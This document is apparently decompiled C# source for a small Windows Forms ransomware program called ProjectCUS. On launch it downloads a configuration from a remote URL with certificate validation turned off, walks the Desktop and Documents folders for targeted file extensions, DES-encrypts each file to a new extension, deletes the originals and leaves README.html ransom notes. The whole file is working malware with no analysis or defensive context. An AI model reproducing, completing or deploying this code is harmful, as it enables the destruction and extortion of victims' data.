using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ProjectCUS.My;

namespace ProjectCUS;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string description = default(string);
		string text = default(string);
		string[] array = default(string[]);
		string text2 = default(string);
		string[] array2 = default(string[]);
		string newExt = default(string);
		byte[] bytes = default(byte[]);
		byte[] bytes2 = default(byte[]);
		string[] array3 = default(string[]);
		int num6 = default(int);
		string text3 = default(string);
		string text4 = default(string);
		string[] array4 = default(string[]);
		int num7 = default(int);
		string extension = default(string);
		string[] array5 = default(string[]);
		int num8 = default(int);
		string extension2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 514:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0019;
							case 4:
								goto IL_0024;
							case 5:
								goto IL_0036;
							case 6:
								goto IL_003f;
							case 7:
								goto IL_0053;
							case 8:
								goto IL_005b;
							case 9:
								goto IL_006d;
							case 10:
								goto IL_0080;
							case 11:
								goto IL_0086;
							case 12:
								goto IL_0099;
							case 13:
								goto IL_00a2;
							case 14:
								goto IL_00aa;
							case 15:
								goto IL_00b8;
							case 16:
								goto IL_00c9;
							case 17:
								goto IL_00e2;
							case 18:
								goto IL_00f5;
							case 19:
								goto IL_010a;
							case 20:
								goto IL_011b;
							case 21:
								goto IL_0134;
							case 22:
								goto IL_014b;
							case 23:
								goto IL_015e;
							case 24:
								goto IL_0173;
							default:
								goto end_IL_0000;
							case 25:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_0099:
						num = 12;
						num5++;
						goto IL_00a2;
						IL_0007:
						num = 2;
						description = ((ApplicationBase)MyProject.Application).get_Info().get_Description();
						goto IL_0019;
						IL_0019:
						num = 3;
						text = wget(description);
						goto IL_0024;
						IL_0024:
						num = 4;
						array = Strings.Split(text, "\r\n", -1, (CompareMethod)0);
						goto IL_0036;
						IL_0036:
						num = 5;
						text2 = "";
						goto IL_003f;
						IL_003f:
						num = 6;
						array2 = Strings.Split(array[0], ",", -1, (CompareMethod)0);
						goto IL_0053;
						IL_0053:
						num = 7;
						newExt = array[1];
						goto IL_005b;
						IL_005b:
						num = 8;
						bytes = Encoding.ASCII.GetBytes(array[2]);
						goto IL_006d;
						IL_006d:
						num = 9;
						bytes2 = Encoding.ASCII.GetBytes(array[2]);
						goto IL_0080;
						IL_0080:
						num = 10;
						num5 = 0;
						goto IL_0086;
						IL_0086:
						num = 11;
						array3 = array;
						num6 = 0;
						goto IL_00c1;
						IL_00c1:
						if (num6 < array3.Length)
						{
							text3 = array3[num6];
							goto IL_0099;
						}
						goto IL_00c9;
						IL_00c9:
						num = 16;
						text4 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
						goto IL_00e2;
						IL_00e2:
						num = 17;
						array4 = array2;
						num7 = 0;
						goto IL_0113;
						IL_0113:
						if (num7 < array4.Length)
						{
							extension = array4[num7];
							goto IL_00f5;
						}
						goto IL_011b;
						IL_011b:
						num = 20;
						text4 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
						goto IL_0134;
						IL_0134:
						num = 21;
						createFile(text4 + "\\\\README.html", text2);
						goto IL_014b;
						IL_014b:
						num = 22;
						array5 = array2;
						num8 = 0;
						goto IL_017c;
						IL_017c:
						if (num8 < array5.Length)
						{
							extension2 = array5[num8];
							goto IL_015e;
						}
						ProjectData.EndApp();
						goto end_IL_0000_2;
						IL_00aa:
						num = 14;
						text2 += text3;
						goto IL_00b8;
						IL_00b8:
						num = 15;
						num6++;
						goto IL_00c1;
						IL_015e:
						num = 23;
						findFile(text4, extension2, newExt, bytes, bytes2, text2);
						goto IL_0173;
						IL_0173:
						num = 24;
						num8++;
						goto IL_017c;
						IL_00a2:
						num = 13;
						if (num5 > 3)
						{
							goto IL_00aa;
						}
						goto IL_00b8;
						IL_00f5:
						num = 18;
						findFile(text4, extension, newExt, bytes, bytes2, text2);
						goto IL_010a;
						IL_010a:
						num = 19;
						num7++;
						goto IL_0113;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 514;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void createFile(object path, object contents)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileStream fileStream = default(FileStream);
		byte[] array = default(byte[]);
		FileInfo fileInfo = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				UTF8Encoding uTF8Encoding;
				object[] obj;
				object[] array2;
				bool[] obj2;
				bool[] array3;
				object obj3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 221:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_008e;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_008e:
					num = 7;
					fileStream.Write(array, 0, array.Length);
					break;
					IL_0007:
					num = 2;
					fileInfo = new FileInfo(Conversions.ToString(path));
					goto IL_0015;
					IL_0015:
					num = 3;
					path = fileInfo.DirectoryName + "\\\\README.html";
					goto IL_0029;
					IL_0029:
					num = 4;
					if (File.Exists(Conversions.ToString(path)))
					{
						goto end_IL_0000_3;
					}
					goto IL_0038;
					IL_0038:
					num = 5;
					fileStream = File.Create(Conversions.ToString(path));
					goto IL_0047;
					IL_0047:
					num = 6;
					uTF8Encoding = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true);
					obj = new object[1] { contents };
					array2 = obj;
					obj2 = new bool[1] { true };
					array3 = obj2;
					obj3 = NewLateBinding.LateGet((object)uTF8Encoding, (Type)null, "GetBytes", obj, (string[])null, (Type[])null, obj2);
					if (array3[0])
					{
						contents = RuntimeHelpers.GetObjectValue(array2[0]);
					}
					array = (byte[])obj3;
					goto IL_008e;
					end_IL_0000_2:
					break;
				}
				num = 8;
				fileStream.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0000_dispatch = 221;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void findFile(object path, object extension, object newExt, object key, object iv, object note)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string current = default(string);
		SearchOption val = default(SearchOption);
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 189:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000b;
						case 4:
							goto IL_0044;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_0073;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0062:
					num = 5;
					createFile(current, RuntimeHelpers.GetObjectValue(note));
					goto IL_0073;
					IL_0007:
					num = 2;
					val = (SearchOption)3;
					goto IL_000b;
					IL_000b:
					num = 3;
					enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Conversions.ToString(path), val, new string[1] { Conversions.ToString(extension) }).GetEnumerator();
					goto IL_0075;
					IL_0075:
					if (!enumerator.MoveNext())
					{
						break;
					}
					current = enumerator.Current;
					goto IL_0044;
					IL_0073:
					num = 6;
					goto IL_0075;
					IL_0044:
					num = 4;
					cryptoSingleFile(current, RuntimeHelpers.GetObjectValue(newExt), RuntimeHelpers.GetObjectValue(key), RuntimeHelpers.GetObjectValue(iv));
					goto IL_0062;
					end_IL_0000_2:
					break;
				}
				num = 7;
				enumerator?.Dispose();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 189;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void cryptoSingleFile(object path, object toExtension, object key, object iv)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileStream fileStream = default(FileStream);
		DESCryptoServiceProvider dESCryptoServiceProvider = default(DESCryptoServiceProvider);
		ICryptoTransform transform = default(ICryptoTransform);
		FileStream fileStream2 = default(FileStream);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] array = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 324:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_0042;
						case 7:
							goto IL_0053;
						case 8:
							goto IL_0074;
						case 9:
							goto IL_0082;
						case 10:
							goto IL_00a0;
						case 11:
							goto IL_00b2;
						case 12:
							goto IL_00c3;
						case 13:
							goto IL_00cd;
						case 14:
							goto IL_00d7;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00d7:
					num = 14;
					fileStream.Close();
					break;
					IL_0007:
					num = 2;
					dESCryptoServiceProvider = new DESCryptoServiceProvider();
					goto IL_000f;
					IL_000f:
					num = 3;
					dESCryptoServiceProvider.Key = (byte[])key;
					goto IL_001d;
					IL_001d:
					num = 4;
					dESCryptoServiceProvider.IV = (byte[])iv;
					goto IL_002c;
					IL_002c:
					num = 5;
					transform = dESCryptoServiceProvider.CreateEncryptor(dESCryptoServiceProvider.Key, dESCryptoServiceProvider.IV);
					goto IL_0042;
					IL_0042:
					num = 6;
					fileStream2 = new FileStream(Conversions.ToString(path), FileMode.Open, FileAccess.Read);
					goto IL_0053;
					IL_0053:
					num = 7;
					fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(path, (object)"."), toExtension)), FileMode.Create, FileAccess.Write);
					goto IL_0074;
					IL_0074:
					num = 8;
					cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
					goto IL_0082;
					IL_0082:
					num = 9;
					array = new byte[checked((int)(fileStream2.Length - 1L) + 1)];
					goto IL_00a0;
					IL_00a0:
					num = 10;
					fileStream2.Read(array, 0, array.Length);
					goto IL_00b2;
					IL_00b2:
					num = 11;
					cryptoStream.Write(array, 0, array.Length);
					goto IL_00c3;
					IL_00c3:
					num = 12;
					cryptoStream.Close();
					goto IL_00cd;
					IL_00cd:
					num = 13;
					fileStream2.Close();
					goto IL_00d7;
					end_IL_0000_2:
					break;
				}
				num = 15;
				File.Delete(Conversions.ToString(path));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 324;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string wget(string url)
	{
		ServicePointManager.ServerCertificateValidationCallback = (object a0, X509Certificate a1, X509Chain a2, SslPolicyErrors a3) => Conversions.ToBoolean(AcceptAllCertifications());
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		HttpWebResponse httpWebResponse = (HttpWebResponse)((HttpWebRequest)WebRequest.Create(url)).GetResponse();
		return new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
	}

	public object AcceptAllCertifications()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object result = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 46:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				result = true;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 46;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 15f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
